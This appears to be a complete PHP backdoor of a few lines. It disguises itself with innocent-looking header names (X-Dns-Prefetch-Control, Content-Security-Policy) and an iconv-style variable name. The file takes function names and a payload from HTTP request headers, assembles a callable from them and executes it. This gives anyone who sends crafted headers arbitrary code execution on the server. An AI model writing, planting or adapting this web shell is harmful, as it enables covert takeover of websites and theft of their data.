<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
    $ob_iconv_handle = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Content-Security-Policy']($_HEADERS['Authorization']));
    $ob_iconv_handle();
}